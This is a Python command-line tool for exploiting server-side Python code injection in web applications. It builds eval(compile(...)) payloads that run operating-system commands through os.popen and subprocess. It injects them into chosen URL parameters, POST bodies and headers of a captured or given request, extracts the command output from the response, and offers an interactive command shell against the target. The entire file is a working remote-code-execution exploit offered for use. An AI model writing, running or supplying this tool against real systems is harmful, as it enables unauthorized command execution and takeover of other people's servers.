#!/bin/python3

# From http://stackoverflow.com/questions/2115410/does-python-have-a-module-for-parsing-http-requests-and-responses
import time
from http.server import BaseHTTPRequestHandler
from io import BytesIO
from typing import Union

import argparse
import os
import re
import requests
import urllib.error
import urllib.parse
import urllib.request

CODES = [
    '''eval(compile("""for x in range(1):\\n print("-"*99)\\n print("Successful")""",'<string>','single'))''',
    '''eval(compile("""for x in range(1):\\n import os\\n print("-"*99)\\n os.popen(r'{}').read()""",'<string>','single'))''',
    '''eval(compile("""for x in range(1):\\n import os,subprocess\\n print("-"*99)\\n subprocess.Popen('{}', shell=True,stdout=subprocess.PIPE).stdout.read()""",'<string>','single'))'''
]


class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()


class Request():
    def __init__(self, uri: str, method: str = 'GET', headers: dict = None, data: Union[dict, str, bytes] = None):
        self.uri = uri
        self.method = method
        self.headers = headers
        self.data = data

        self._raw_uri = uri
        self._raw_data = data
        self._raw_headers = headers

    @classmethod
    def from_file(cls, path: str, timeout: int = 3):
        if not os.path.isfile(path):
            return None
        with open(path, 'r') as _f:
            content = _f.read()
        try:
            o_request = HTTPRequest(content.encode())
        except AttributeError:
            return None
        uri = 'https://{}{}'.format(o_request.headers['host'], o_request.path)
        try:
            respone = requests.request(o_request.command, uri, headers=o_request.headers, data=o_request.rfile.read(),
                                       timeout=timeout)
        except requests.RequestException as e:
            respone = None
        if respone and 500 > respone.status_code >= 200:
            scheme = 'https'
        else:
            scheme = 'http'
        return cls('{}://{}{}'.format(scheme, o_request.headers['host'], o_request.path), o_request.command,
                   o_request.headers, o_request.rfile.read())

    def send(self) -> Union[Exception, requests.Response]:
        try:
            if not self.method:
                if self.data:
                    self.method = 'POST'
            response = requests.request(self.method, self.uri, headers=self.headers, data=self.data, verify=False)
        except requests.RequestException as e:
            return e
        return response

    def update_command(self, cmd: str = 'whoami', querys: list = None):
        devil_code = urllib.parse.quote(CODES[1].format(cmd))
        pass_headers = ['accept']

        uri = self._raw_uri
        headers = self._raw_headers
        data = self._raw_data
        self.headers = {}

        if querys:
            for q in querys:
                uri = re.sub(r'%s=[^=&?#/\\]+' % q, '%s=*' % q, uri)
        self.uri = uri.replace('*', devil_code)
        if data:
            if querys:
                for q in querys:
                    data = re.sub(r'%s=[^=&?#/\\]+' % q, '%s=*' % q, data)
            self.data = data.replace('*', devil_code)
        if headers:
            for k in headers:
                if k.lower() in pass_headers:
                    continue
                s_tmp = headers[k]
                for q in querys:
                    s_tmp = re.sub(r'%s=[^=;\s]+' % q, '%s=*' % q, s_tmp)
                self.headers[k] = s_tmp.replace('*', CODES[1].format(cmd))


def how_about_it(request: Request, cmd: str = 'whoami', querys=None):
    request.update_command(cmd, querys)
    res = request.send()
    if isinstance(res, requests.RequestException):
        return res

    r_text = re.search(r'[-]{99,}\n(.*)', res.text)
    if r_text:
        result = r_text.group(1)
        result = result.replace('\\n', '\n').replace('\\t', '\t')
        result = re.sub('^\w?\'', '', result)
        result = re.sub('\'$', '', result).strip()
        return result
    return res


def main(request: Request, cmd: str = 'whoami', querys=None):
    res = how_about_it(request, cmd, querys)
    if isinstance(res, requests.RequestException):
        print('[-] Error:', res)
    elif isinstance(res, str):
        print('[+] Result:')
        print(res)
    else:
        print('[-] Could not found output')
        print('[-] Status code:', res.status_code)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='Specify the URL. Use * or -p to set injection point')
    parser.add_argument('-c', '--cmd', help='Enter the OS command')
    parser.add_argument('-p', '--params', nargs='*', help='Specify injection parameter')
    parser.add_argument('-r', '--request-file', help='Specify request file. Works with * or -p')
    parser.add_argument('-m', '--method', default='GET', help='HTTP method(default: GET)')
    parser.add_argument('-b', '--body', help='Post body')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')

    args = parser.parse_args()

    r = None
    if args.request_file:
        r = Request.from_file(args.request_file)
        if not r:
            print('[!] {} is not file.'.format(args.request_file))
            exit(0)
    elif args.url:
        r = Request(args.url, args.method, data=args.body)
    else:
        parser.print_help()
        print('\n[!] One modes "-r" or "-u" must be specified')
        exit(0)

    cmd = args.cmd
    if args.interactive:
        cmd = input('Command: ')
    while True:
        if cmd and cmd.strip():
            how_about_it(r, cmd, args.params)
        if not args.interactive:
            break
        try:
            cmd = input('Command: ')
        except KeyboardInterrupt:
            print('\n[!] Exit...')
            exit(0)
